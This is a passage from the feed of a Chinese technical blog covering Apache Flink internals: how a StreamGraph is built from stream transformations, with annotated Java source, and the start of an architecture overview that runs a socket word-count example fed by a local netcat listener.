class=&quot;line&quot;&gt;  streamGraph.addOperator(transform.getId(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      slotSharingGroup,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transform.getOperator(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transform.getInputType(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transform.getOutputType(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transform.getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform.getStateKeySelector() != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    TypeSerializer&amp;lt;?&amp;gt; keySerializer = transform.getStateKeyType().createSerializer(env.getConfig());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    streamGraph.setOneInputStateKey(transform.getId(), transform.getStateKeySelector(), keySerializer);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  streamGraph.setParallelism(transform.getId(), transform.getParallelism());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 添加 StreamEdge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (Integer inputId: inputIds) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    streamGraph.addEdge(inputId, transform.getId(), &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; Collections.singleton(transform.getId());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该函数首先会对该transform的上游transform进行递归转换，确保上游的都已经完成了转化。然后通过transform构造出StreamNode，最后与上游的transform进行连接，构造出StreamNode。&lt;/p&gt;
&lt;p&gt;最后再来看下对逻辑转换（partition、union等）的处理，如下是&lt;code&gt;transformPartition&lt;/code&gt;函数的源码：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span class=&quot;function&quot;&gt;Collection&amp;lt;Integer&amp;gt; &lt;span class=&quot;title&quot;&gt;transformPartition&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(PartitionTransformation&amp;lt;T&amp;gt; partition)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  StreamTransformation&amp;lt;T&amp;gt; input = partition.getInput();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  List&amp;lt;Integer&amp;gt; resultIds = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 直接上游的id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Collection&amp;lt;Integer&amp;gt; transformedIds = transform(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (Integer transformedId: transformedIds) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 生成一个新的虚拟id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; virtualId = StreamTransformation.getNewNodeId();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 添加一个虚拟分区节点，不会生成 StreamNode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    streamGraph.addVirtualPartitionNode(transformedId, virtualId, partition.getPartitioner());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    resultIds.add(virtualId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; resultIds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对partition的转换没有生成具体的StreamNode和StreamEdge，而是添加一个虚节点。当partition的下游transform（如map）添加edge时（调用&lt;code&gt;StreamGraph.addEdge&lt;/code&gt;），会把partition信息写入到edge中。如&lt;code&gt;StreamGraph.addEdgeInternal&lt;/code&gt;所示：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;addEdge&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Integer upStreamVertexID, Integer downStreamVertexID, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; typeNumber)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  addEdgeInternal(upStreamVertexID, downStreamVertexID, typeNumber, &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;String&amp;gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;addEdgeInternal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Integer upStreamVertexID,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Integer downStreamVertexID,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; typeNumber,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StreamPartitioner&amp;lt;?&amp;gt; partitioner,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    List&amp;lt;String&amp;gt; outputNames)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 当上游是select时，递归调用，并传入select信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (virtualSelectNodes.containsKey(upStreamVertexID)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; virtualId = upStreamVertexID;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// select上游的节点id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    upStreamVertexID = virtualSelectNodes.get(virtualId).f0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (outputNames.isEmpty()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// selections that happen downstream override earlier selections&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      outputNames = virtualSelectNodes.get(virtualId).f1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    addEdgeInternal(upStreamVertexID, downStreamVertexID, typeNumber, partitioner, outputNames);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 当上游是partition时，递归调用，并传入partitioner信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (virtuaPartitionNodes.containsKey(upStreamVertexID)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; virtualId = upStreamVertexID;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// partition上游的节点id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    upStreamVertexID = virtuaPartitionNodes.get(virtualId).f0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (partitioner == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      partitioner = virtuaPartitionNodes.get(virtualId).f1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    addEdgeInternal(upStreamVertexID, downStreamVertexID, typeNumber, partitioner, outputNames);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 真正构建StreamEdge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StreamNode upstreamNode = getStreamNode(upStreamVertexID);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StreamNode downstreamNode = getStreamNode(downStreamVertexID);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 未指定partitioner的话，会为其选择 forward 或 rebalance 分区。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (partitioner == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; upstreamNode.getParallelism() == downstreamNode.getParallelism()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      partitioner = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ForwardPartitioner&amp;lt;Object&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (partitioner == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      partitioner = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; RebalancePartitioner&amp;lt;Object&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 健康检查， forward 分区必须要上下游的并发度一致&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (partitioner &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; ForwardPartitioner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (upstreamNode.getParallelism() != downstreamNode.getParallelism()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; UnsupportedOperationException(&lt;span class=&quot;string&quot;&gt;&quot;Forward partitioning does not allow &quot;&lt;/span&gt; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;change of parallelism. Upstream operation: &quot;&lt;/span&gt; + upstreamNode + &lt;span class=&quot;string&quot;&gt;&quot; parallelism: &quot;&lt;/span&gt; + upstreamNode.getParallelism() +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;, downstream operation: &quot;&lt;/span&gt; + downstreamNode + &lt;span class=&quot;string&quot;&gt;&quot; parallelism: &quot;&lt;/span&gt; + downstreamNode.getParallelism() +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot; You must use another partitioning strategy, such as broadcast, rebalance, shuffle or global.&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 创建 StreamEdge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StreamEdge edge = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StreamEdge(upstreamNode, downstreamNode, typeNumber, outputNames, partitioner);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 将该 StreamEdge 添加到上游的输出，下游的输入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getStreamNode(edge.getSourceId()).addOutEdge(edge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getStreamNode(edge.getTargetId()).addInEdge(edge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;实例讲解&quot;&gt;&lt;a href=&quot;#实例讲解&quot; class=&quot;headerlink&quot; title=&quot;实例讲解&quot;&gt;&lt;/a&gt;实例讲解&lt;/h2&gt;&lt;p&gt;如下程序，是一个从 Source 中按行切分成单词并过滤输出的简单流程序，其中包含了逻辑转换：随机分区shuffle。我们会分析该程序是如何生成StreamGraph的。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DataStream&amp;lt;String&amp;gt; text = env.socketTextStream(hostName, port);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;text.flatMap(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LineSplitter()).shuffle().filter(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; HelloFilter()).print();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先会在env中生成一棵transformation树，用&lt;code&gt;List&amp;lt;StreamTransformation&amp;lt;?&amp;gt;&amp;gt;&lt;/code&gt;保存。其结构图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1w3SQJFXXXXalXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;其中符号&lt;code&gt;*&lt;/code&gt;为input指针，指向上游的transformation，从而形成了一棵transformation树。然后，通过调用&lt;code&gt;StreamGraphGenerator.generate(env, transformations)&lt;/code&gt;来生成StreamGraph。自底向上递归调用每一个transformation，也就是说处理顺序是Source-&amp;gt;FlatMap-&amp;gt;Shuffle-&amp;gt;Filter-&amp;gt;Sink。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1s7SpJFXXXXXjaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先处理的Source，生成了Source的StreamNode。&lt;/li&gt;
&lt;li&gt;然后处理的FlatMap，生成了FlatMap的StreamNode，并生成StreamEdge连接上游Source和FlatMap。由于上下游的并发度不一样（1:4），所以此处是Rebalance分区。&lt;/li&gt;
&lt;li&gt;然后处理的Shuffle，由于是逻辑转换，并不会生成实际的节点。将partitioner信息暂存在&lt;code&gt;virtuaPartitionNodes&lt;/code&gt;中。&lt;/li&gt;
&lt;li&gt;在处理Filter时，生成了Filter的StreamNode。发现上游是shuffle，找到shuffle的上游FlatMap，创建StreamEdge与Filter相连。并把ShufflePartitioner的信息写到StreamEdge中。&lt;/li&gt;
&lt;li&gt;最后处理Sink，创建Sink的StreamNode，并生成StreamEdge与上游Filter相连。由于上下游并发度一样（4:4），所以此处选择 Forward 分区。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后可以通过 &lt;a href=&quot;http://flink.apache.org/visualizer/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;UI可视化&lt;/a&gt; 来观察得到的 StreamGraph。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1y_1FJFXXXXapaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文主要介绍了 Stream API 中 Transformation 和 Operator 的概念，以及如何根据Stream API编写的程序，构造出一个代表拓扑结构的StreamGraph的。本文的源码分析涉及到较多代码，如果有兴趣建议结合完整源码进行学习。下一篇文章将介绍 StreamGraph 如何转换成 JobGraph 的，其中设计到了图优化的技巧。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;继上文&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/&quot;&gt;Flink 原理与实现：架构和拓扑概览&lt;/a&gt;中介绍了Flink的四层执行图模型，本文将主要介绍 Flink 是如何根据用户用Stream API编写的程序，构造出一个代表拓扑结构的StreamGraph的。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：本文比较偏源码分析，所有代码都是基于 flink-1.0.x 版本，建议在阅读本文前先对Stream API有个了解，详见&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/apis/streaming/index.html&quot;&gt;官方文档&lt;/a&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;StreamGraph 相关的代码主要在 &lt;code&gt;org.apache.flink.streaming.api.graph&lt;/code&gt; 包中。构造StreamGraph的入口函数是 &lt;code&gt;StreamGraphGenerator.generate(env, transformations)&lt;/code&gt;。该函数会由触发程序执行的方法&lt;code&gt;StreamExecutionEnvironment.execute()&lt;/code&gt;调用到。也就是说 StreamGraph 是在 Client 端构造的，这也意味着我们可以在本地通过调试观察 StreamGraph 的构造过程。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="源码分析" scheme="http://wuchong.me/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：架构和拓扑概览</title>
    <link href="http://wuchong.me/blog/2016/05/03/flink-internals-overview/"/>
    <id>http://wuchong.me/blog/2016/05/03/flink-internals-overview/</id>
    <published>2016-05-03T15:41:40.000Z</published>
    <updated>2016-05-12T12:17:37.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;架构&quot;&gt;&lt;a href=&quot;#架构&quot; class=&quot;headerlink&quot; title=&quot;架构&quot;&gt;&lt;/a&gt;架构&lt;/h2&gt;&lt;p&gt;要了解一个系统，一般都是从架构开始。我们关心的问题是：系统部署成功后各个节点都启动了哪些服务，各个服务之间又是怎么交互和协调的。下方是 Flink 集群启动后架构图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1ObBnJFXXXXXtXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当 Flink 集群启动后，首先会启动一个 JobManger 和一个或多个的 TaskManager。由 Client 提交任务给 JobManager，JobManager 再调度任务到各个 TaskManager 去执行，然后 TaskManager 将心跳和统计信息汇报给 JobManager。TaskManager 之间以流的形式进行数据的传输。上述三者均为独立的 JVM 进程。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt; 为提交 Job 的客户端，可以是运行在任何机器上（与 JobManager 环境连通即可）。提交 Job 后，Client 可以结束进程（Streaming的任务），也可以不结束并等待结果返回。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JobManager&lt;/strong&gt; 主要负责调度 Job 并协调 Task 做 checkpoint，职责上很像 Storm 的 Nimbus。从 Client 处接收到 Job 和 JAR 包等资源后，会生成优化后的执行计划，并以 Task 的单元调度到各个 TaskManager 去执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TaskManager&lt;/strong&gt; 在启动的时候就设置好了槽位数（Slot），每个 slot 能启动一个 Task，Task 为线程。从 JobManager 处接收需要部署的 Task，部署启动后，与自己的上游建立 Netty 连接，接收数据并处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以看到 Flink 的任务调度是多线程模型，并且不同Job/Task混合在一个 TaskManager 进程中。虽然这种方式可以有效提高 CPU 利用率，但是个人不太喜欢这种设计，因为不仅缺乏资源隔离机制，同时也不方便调试。类似 Storm 的进程模型，一个JVM 中只跑该 Job 的 Tasks 实际应用中更为合理。&lt;/p&gt;
&lt;h2 id=&quot;Job-例子&quot;&gt;&lt;a href=&quot;#Job-例子&quot; class=&quot;headerlink&quot; title=&quot;Job 例子&quot;&gt;&lt;/a&gt;Job 例子&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本文所示例子为 flink-1.0.x 版本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们使用 Flink 自带的 examples 包中的 &lt;code&gt;SocketTextStreamWordCount&lt;/code&gt;，这是一个从 socket 流中统计单词出现次数的例子。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先，使用 &lt;strong&gt;netcat&lt;/strong&gt; 启动本地服务器：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ nc &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; 9000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;然后提交 Flink 程序&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ bin/flink run examples/streaming/SocketTextStreamWordCount.jar \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --hostname 10.218.130.9 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --port 9000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在netcat端输入单词并监控 taskmanager 的输出可以看到单词统计的结果。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SocketTextStreamWordCount&lt;/code&gt; 的具体代码如下： &lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 检查输入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; ParameterTool params = ParameterTool.fromArgs(args);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// set up the execution environment&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// get input data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  DataStream&amp;lt;String&amp;gt; text =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      env.socketTextStream(params.get(&lt;span class=&quot;string&quot;&gt;&quot;hostname&quot;&lt;/span&gt;), params.getInt(&lt;span class=&quot;string&quot;&gt;&quot;port&quot;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  DataStream&amp;lt;Tuple2&amp;lt;String, Integer&amp;gt;&amp;gt; counts =&lt;/span&gt;&lt;br&gt;&lt;span 